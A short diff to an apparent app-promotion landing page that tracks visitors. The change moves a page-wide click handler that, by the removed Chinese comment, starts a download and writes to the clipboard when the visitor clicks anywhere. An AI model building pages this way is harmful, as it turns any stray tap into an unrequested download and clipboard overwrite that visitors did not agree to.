@@ -112,7 +112,7 @@
     <!-- End Meta Pixel Code -->
   </head>
 
-  <body>
+  <body onclick="onClickBtn()">
     <div class="container">
       <img class="BG" src="files/background.webp" alt="background" />
       <div class="btn-container">
@@ -178,9 +178,6 @@
       window.onload = function () {
         sendTrack("/onshow");
       };
-      // 全屏点击触发下载 + 复制（需要用户手势，剪贴板才能写入）
-      document.addEventListener("click", onClickBtn, true);
-      document.addEventListener("touchend", onClickBtn, true);
 
       let clicked = false;
       function onClickBtn() {
